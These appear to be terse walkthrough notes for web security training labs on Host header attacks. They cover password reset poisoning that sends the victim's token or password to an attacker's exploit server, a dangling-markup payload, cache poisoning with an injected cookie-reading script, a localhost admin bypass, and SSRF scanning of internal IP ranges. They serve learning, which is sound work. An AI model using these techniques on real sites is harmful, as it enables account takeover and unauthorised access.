# Lab: Basic password reset poisoning

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Change the Host to exploit-[id].exploit-server.net/exploit -> Send -> Go to exploit server - access log -> You will get the token:
`GET /exploit/forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` ->
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` and then you can enter a new password -> then login as carlos



# Lab: Password reset poisoning via middleware

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Add `X-Forwarded-Host: exploit-[id].exploit-server.net/exploit` -> Send -> Go to exploit server - access log -> You will get the token: 
`GET /forgot-password?temp-forgot-password-token=85cjg3lq7f7k92tv3ywgpoxrzqvmbtue` -> 
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=85cjg3lq7f7k92tv3ywgpoxrzqvmbtue` and then you can enter a new password -> then login as carlos



# Lab: Password reset poisoning via dangling markup

Forgot password -> Enter your own username -> Capture POST request in Burp -> In Repeater, change Host header to add an arbitrary port: `[id].web-security-academy.net:1234` -> Send -> Go to exploit server -> Open email client -> View raw version of email -> Notice your port reflected unescaped in a link followed by the new password -> 
Now inject dangling markup: `Host: [id].web-security-academy.net:'<a href="//YOUR-EXPLOIT-ID.exploit-server.net/` -> Send -> Check email client (raw version) -> Go to exploit server access log -> Find `GET /?/login'>...` containing the rest of the email with your password -> Change username to `carlos` -> Send -> Refresh access log -> Get Carlos's new password from log -> Login as carlos



# Lab: Web cache poisoning via ambiguous requests

Home page -> Send GET / to Repeater -> Notice Host header validation -> Add cache buster: `GET /?cb=123` -> Add second Host header with arbitrary value -> Observe it's reflected in script URL: `/resources/js/tracking.js`

Exploit server -> Create `/resources/js/tracking.js` with `alert(document.cookie)` -> Copy exploit server domain

Back to Repeater -> Add second Host header: `Host: id.exploit-server.net` -> Send until cache hit (response shows your exploit server in script URL) -> Load `/?cb=123` in browser -> Alert fires

Remove cache buster -> Replay request repeatedly to poison cache -> Lab solved when victim visits home page



# Lab: Host header authentication bypass

Send GET / to Repeater -> Notice you can change Host header to anything and still access page -> Browse to `/robots.txt` -> Finds `/admin` panel -> Try `/admin` -> Access denied -> Error says local users only -> Send GET /admin to Repeater -> Change Host header to `localhost` -> Access granted (admin panel with delete option) -> Change request line to `GET /admin/delete?username=carlos` -> Send -> Lab solved


# Lab: Routing-based SSRF

Send GET / to Repeater -> Replace Host header with Collaborator payload -> Send -> Poll Collaborator -> HTTP request received (can make server issue requests to arbitrary server) -> Send GET / to Intruder -> Deselect "Update Host header to match target" -> Set Host header: `192.168.0.§0§` -> Payload: Numbers from 0 to 255 (step 1) -> Start attack -> Sort by Status column -> One request got 302 redirect to `/admin` -> Send to Repeater -> Change request line to `GET /admin` -> Send -> Access granted (admin panel) -> Find CSRF token from response -> Craft request: `GET /admin/delete?csrf=TOKEN&username=carlos` -> Send -> Lab solved


# Lab: SSRF via flawed request parsing

Send GET / to Repeater -> Use Collaborator: `GET https://ID.web-security-academy.net/` with `Host: BURP-COLLABORATOR-SUBDOMAIN` -> Send -> Poll Collaborator -> Confirms server issues requests to arbitrary host -> Send to Intruder -> Deselect "Update Host header to match target" -> Use Host header to scan `192.168.0.0/24` (range 0-255) -> Find admin interface IP -> Send to Repeater -> Append `/admin` to absolute URL: `GET https://ID.web-security-academy.net/admin` -> Access granted Change to `/admin/delete?csrf=TOKEN&username=carlos` -> Copy CSRF token from response -> Copy session cookie from Set-Cookie -> Add cookie to request -> Change request method to POST -> Send -> Lab solved


# Lab: Host validation bypass via connection state attack

Send GET / to Repeater -> Change path to `/admin` and Host to `192.168.0.1` -> Get redirected to homepage -> Duplicate tab -> Add both tabs to a group -> Tab 1: path `/`, Host back to `ID.h1-web-security-academy.net` -> Tab 2: path `/admin`, Host `192.168.0.1` -> Change send mode to **Send group in sequence (single connection)** -> Set `Connection: keep-alive` on both -> Send sequence -> Second request now accesses admin panel (bypass achieved) -> From admin response, note: action=`/admin/delete`, input name=`username`, and CSRF token -> Then edit /admin to `GET /admin/delete?csrf=TOKEN&username=carlos HTTP/1.1` -> Send group sequence again -> Lab solved
